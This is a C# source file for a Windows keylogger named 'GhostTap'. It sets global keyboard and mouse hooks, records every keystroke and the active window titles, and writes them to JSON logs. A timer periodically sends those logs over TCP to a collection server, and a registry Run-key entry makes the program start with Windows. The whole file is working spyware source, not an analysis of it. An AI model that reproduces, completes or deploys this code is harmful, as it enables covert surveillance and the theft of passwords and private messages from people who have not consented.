using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Newtonsoft.Json;

namespace GhostTap
{
    class Keylogger
    {
        private static EncryptionHelper encryptedLogger = new EncryptionHelper("GhostTapSecureKeyAES256");
        private const int KEYBOARD_LL = 13;
        private const int MOUSE_LL = 14;
        private const int KEYDOWN = 0x0100;
        private const int KEYUP = 0x0101;
        private const int LBUTTONDOWN = 0x0201;
        private const int RBUTTONDOWN = 0x0204;
        private static bool isShiftDown = false;
        private static bool isCtrlDown = false;
        private static bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
        private static IntPtr mouseHookID = IntPtr.Zero;
        private static IntPtr keyboardHookID = IntPtr.Zero;
        private static ConcurrentQueue<string> keyQueue = new ConcurrentQueue<string>();
        private static ConcurrentQueue<string> windowQueue = new ConcurrentQueue<string>();
        private static ConcurrentQueue<string> pendingFiles = new ConcurrentQueue<string>();
        private static bool isSendingFiles = false;
        private static string lastWindow = "";
        private static CancellationTokenSource tokenSource = new CancellationTokenSource();
        private static System.Timers.Timer logSendTimer;

        public void Start()
        {
            try
            {
                keyboardHookID = SetKeyboardHook(KeyboardHookCallback);
                mouseHookID = SetMouseHook(MouseHookCallback);
                StartQueueProcessor();
                StartFileSendTimer(5);
                AppDomain.CurrentDomain.ProcessExit += Shutdown;
                Application.Run();
            }
            catch (Exception ex)
            {
                SendErrorToServer(new KeyloggerMessage { Timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), Tag = "[KEYLOGGER_ERROR]", Message = $"During startup: {ex.Message}" });
            }
        }
        private static void Shutdown(object sender, EventArgs e)
        {
            try
            {
                logSendTimer?.Stop();
                tokenSource.Cancel();
                Thread.Sleep(500);
                UnhookHooks();
            }
            catch (Exception ex)
            {
                SendErrorToServer(new KeyloggerMessage { Timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), Tag = "[KEYLOGGER_ERROR]", Message = $"During shutdown: {ex.Message}" });
            }
        }
        private static void StartQueueProcessor()
        {
            Thread queueThread = new Thread(ProcessQueues)
            {
                IsBackground = true
            };
            queueThread.Start();
        }
        private static void ProcessQueues()
        {
            string logPath = "keyLog_decrypted.json";
            while (!tokenSource.Token.IsCancellationRequested)
            {
                try
                {
                    using (StreamWriter writer = new StreamWriter(logPath, true, Encoding.UTF8))
                    {
                            while (windowQueue.TryDequeue(out string win))
                            {
                                try
                                {
                                    var obj = new KeyloggerMessage { Timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), Tag = "[window]", Message = win };
                                    string json = JsonConvert.SerializeObject(obj);
                                    writer.WriteLine(json);
                                    writer.Flush();
                                }
                                catch (Exception ex)
                                {
                                    SendErrorToServer(new KeyloggerMessage { Timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), Tag = "[KEYLOGGER_ERROR]", Message = $"During key writing: {ex.Message}" });
                                }
                            }
                            while (keyQueue.TryDequeue(out string key))
                            {
                                try
                                {
                                    var obj = new KeyloggerMessage { Timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), Tag = "[key]", Message = key };
                                    string json = JsonConvert.SerializeObject(obj);
                                    writer.WriteLine(json);
                                    writer.Flush();
                                }
                                catch (Exception ex)
                                {
                                    SendErrorToServer(new KeyloggerMessage { Timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), Tag = "[KEYLOGGER_ERROR]", Message = $"During window writing: {ex.Message}" });
                                }
                            }
                    }
                }
                catch (Exception ex)
                {
                    SendErrorToServer(new KeyloggerMessage { Timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), Tag = "[KEYLOGGER_ERROR]", Message = $"During queue processing: {ex.Message}" });
                }
                Thread.Sleep(100);
            }
        }
        public static void StartFileSendTimer(int intervalMinutes)
        {
            if(intervalMinutes < 5)
            {
                SendErrorToServer(new KeyloggerMessage {Timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), Tag = "[KEYLOGGER_ERROR]", Message = "Interval must be at least 5 minutes."});
                return;
            }
            logSendTimer = new System.Timers.Timer(intervalMinutes * 60 * 1000);
            logSendTimer.Elapsed += (sender, e) =>
            {
                SendEncryptedFileToServer("keyLog.json");
                SendEncryptedFileToServer("errorLog.json");
                RetryPendingFileSends();
            };
            logSendTimer.AutoReset = true;
            logSendTimer.Enabled = true;
        }
        private static void RetryPendingFileSends()
        {
            if (isSendingFiles) return;
            isSendingFiles = true;

            ThreadPool.QueueUserWorkItem(_ =>
            {
                while (!pendingFiles.IsEmpty)
                {
                    if (pendingFiles.TryDequeue(out string pendingFile))
                    {
                        SendEncryptedFileToServer(pendingFile);
                    }
                }
                isSendingFiles = false;
            });
        }
        private static void UnhookHooks()
        {
            if (keyboardHookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(keyboardHookID);
                keyboardHookID = IntPtr.Zero;
            }

            if (mouseHookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(mouseHookID);
                mouseHookID = IntPtr.Zero;
            }
        }
        private static IntPtr SetKeyboardHook(LLKeyboardProc proc)
        {
            try
            {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(KEYBOARD_LL, proc, GetModuleHandle(curModule?.ModuleName), 0);
                }
            }
            catch (Exception ex)
            {
                SendErrorToServer(new KeyloggerMessage { Timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), Tag = "[KEYLOGGER_ERROR]", Message = $"During keyboard hook installation: {ex.Message}" });
                return IntPtr.Zero;
            }
        }
        private static IntPtr SetMouseHook(LLMouseProc proc)
        {
            try
            {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(MOUSE_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }
            catch (Exception ex)
            {
                SendErrorToServer(new KeyloggerMessage { Timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), Tag = "[KEYLOGGER_ERROR]", Message = $"During mouse hook installation: {ex.Message}" });
                return IntPtr.Zero;
            }
        }
        private static IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    bool isKeyDown = wParam == (IntPtr)KEYDOWN;
                    bool isKeyUp = wParam == (IntPtr)KEYUP;
                    if (vkCode == (int)Keys.CapsLock)
                    {
                        if (wParam == (IntPtr)KEYUP)
                        {
                            isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
                            if (isCapsLockOn)
                            {
                                keyQueue.Enqueue("CAPS_ON");
                            }
                            else
                            {
                                keyQueue.Enqueue("CAPS_OFF");
                            }
                        }
                        return CallNextHookEx(keyboardHookID, nCode, wParam, lParam);
                    }
                    if (vkCode == (int)Keys.LShiftKey || vkCode == (int)Keys.RShiftKey)
                    {
                        if (isKeyDown && !isShiftDown)
                        {
                            isShiftDown = true;
                            keyQueue.Enqueue("SHIFT_DOWN");
                        }
                        else if (isKeyUp && isShiftDown)
                        {
                            isShiftDown = false;
                            keyQueue.Enqueue("SHIFT_UP");
                        }
                        return CallNextHookEx(keyboardHookID, nCode, wParam, lParam);
                    }
                    if (vkCode == (int)Keys.LControlKey || vkCode == (int)Keys.RControlKey)
                    {
                        if (isKeyDown && !isCtrlDown)
                        {
                            isCtrlDown = true;
                            keyQueue.Enqueue("CTRL_DOWN");
                        }
                        else if (isKeyUp && isCtrlDown)
                        {
                            isCtrlDown = false;
                            keyQueue.Enqueue("CTRL_UP");
                        }
                        return CallNextHookEx(keyboardHookID, nCode, wParam, lParam);
                    }
                    if (isKeyDown)
                    {
                        string key;
                        if (vkCode == (int)Keys.Space)
                        {
                            key = "SPACE";
                        }
                        else if (vkCode == (int)Keys.Back)
                        {
                            key = "BACKSPACE";
                        }
                        //else if (vkCode == (int)Keys.Tab)
                        //{
                        //    key = "TAB";
                        //}
                        else
                        {
                            key = GetUnicodeKey(vkCode, isShiftDown);
                        }
                        keyQueue.Enqueue(key);
                    }
                }
            }
            catch (Exception ex)
            {
                SendErrorToServer(new KeyloggerMessage { Timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), Tag = "[KEYLOGGER_ERROR]", Message = $"During keyboard hook installation: {ex.Message}" });
            }
            return CallNextHookEx(keyboardHookID, nCode, wParam, lParam);
        }
        private static IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)LBUTTONDOWN || wParam == (IntPtr)RBUTTONDOWN))
            {
                string currentWindow = GetActiveWindowTitle();
                if (!string.IsNullOrEmpty(currentWindow) && currentWindow != lastWindow)
                {
                    lastWindow = currentWindow;
                    windowQueue.Enqueue(currentWindow);
                }
            }
            return CallNextHookEx(mouseHookID, nCode, wParam, lParam);
        }
        private static string GetUnicodeKey(int vkCode, bool shiftPressed)
        {
            try
            {
                byte[] keyboardState = new byte[256];
                GetKeyboardState(keyboardState);

                if (shiftPressed)
                {
                    keyboardState[(int)Keys.ShiftKey] = 0x80;
                    keyboardState[(int)Keys.LShiftKey] = 0x80;
                }
                if (isCapsLockOn)
                {
                    keyboardState[(int)Keys.CapsLock] = 0x01;
                }

                uint scanCode = (uint)MapVirtualKey((uint)vkCode, 0);
                StringBuilder sb = new StringBuilder(5);
                IntPtr foregroundWindow = GetForegroundWindow();
                uint threadId = GetWindowThreadProcessId(foregroundWindow, IntPtr.Zero);
                IntPtr layout = GetKeyboardLayout(threadId);
                int result = ToUnicodeEx((uint)vkCode, scanCode, keyboardState, sb, sb.Capacity, 0, layout);

                if (result > 0)
                {
                    string character = sb.ToString();
                    if (char.IsLetter(character[0]))
                    {
                        bool upper = isCapsLockOn ^ shiftPressed;
                        return upper ? character.ToUpper() : character.ToLower();
                    }
                    return character;
                }
                else
                {
                    return $"[{(Keys)vkCode}]";
                }
            }
            catch
            {
                return $"[{(Keys)vkCode}]";
            }
        }
        private static string GetActiveWindowTitle()
        {
            try
            {
                IntPtr handle = GetForegroundWindow();
                int length = GetWindowTextLength(handle);
                if (length == 0) return string.Empty;
                StringBuilder sb = new StringBuilder(length + 1);
                GetWindowText(handle, sb, sb.Capacity);
                return sb.ToString();
            }
            catch
            {
                return string.Empty;
            }
        }
        private static void SendErrorToServer(KeyloggerMessage data)
        {
            string json = JsonConvert.SerializeObject(data);
            string encryptedJson = encryptedLogger.Encrypt(json);
            try
            {
                using (TcpClient client = new TcpClient("127.0.0.1", 12345))
                using (NetworkStream stream = client.GetStream())
                {
                    byte[] bytes = Encoding.UTF8.GetBytes(json + "\n");
                    stream.Write(bytes, 0, bytes.Length);
                }
            }
            catch
            {
                File.AppendAllText("errorLog.json", encryptedJson + Environment.NewLine);
            }
        }
        private static void SendEncryptedFileToServer(string filePath)
        {
            
            if (!File.Exists(filePath)) return;
            string tempFilePath = filePath + ".sending";
            for (int i = 0; i < 5; i++)
            {
                try
                {
                    File.Move(filePath, tempFilePath);
                    break;
                }
                catch (IOException)
                {
                    Thread.Sleep(200);
                }
            }
            if (!File.Exists(tempFilePath)) return;
            try
            {
                byte[] encryptedData = File.ReadAllBytes(tempFilePath);
                using (TcpClient client = new TcpClient("127.0.0.1", 12345))
                using (NetworkStream stream = client.GetStream())
                {
                    byte[] fileNameBytes = Encoding.UTF8.GetBytes(Path.GetFileName(filePath) + "\n");
                    stream.Write(fileNameBytes, 0, fileNameBytes.Length);
                    stream.Write(encryptedData, 0, encryptedData.Length);
                    Console.WriteLine($"[INFO] File '{filePath}' sent to server.");
                }
                File.Delete(tempFilePath);
            }
            catch (Exception ex)
            {
                if(File.Exists(filePath))
                {
                    File.Delete(filePath);
                }
                File.Move(tempFilePath, filePath);
                pendingFiles.Enqueue(filePath);
                SendErrorToServer(new KeyloggerMessage { Timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), Tag = "[KEYLOGGER_ERROR]", Message = $"During sending file: {ex.Message}" });
            }
        }
        public static void SetAutoStart(bool enable)
        {
            try
            {
                string appName = "GhostTapLogger";
                string exePath = Application.ExecutablePath;

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (enable)
                    {
                        key.SetValue(appName, "\"" + exePath + "\"");
                    }
                    else
                    {
                        key.DeleteValue(appName, false);
                    }
                }
            }
            catch (Exception ex)
            {
                SendErrorToServer(new KeyloggerMessage { Timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), Tag = "[KEYLOGGER_ERROR]", Message = $"Autostart error: {ex.Message}" });
            }
        }
        private delegate IntPtr LLKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")] private static extern IntPtr GetKeyboardLayout(uint idThread);
        [DllImport("user32.dll")] private static extern bool GetKeyboardState(byte[] lpKeyState);
        private delegate IntPtr LLMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, LLMouseProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, LLKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
        [DllImport("user32.dll")] private static extern int GetWindowTextLength(IntPtr hWnd);
        [DllImport("user32.dll")] private static extern uint MapVirtualKey(uint uCode, uint uMapType);
        [DllImport("user32.dll")] private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
        [DllImport("user32.dll")] private static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr lpdwProcessId);
    }
}
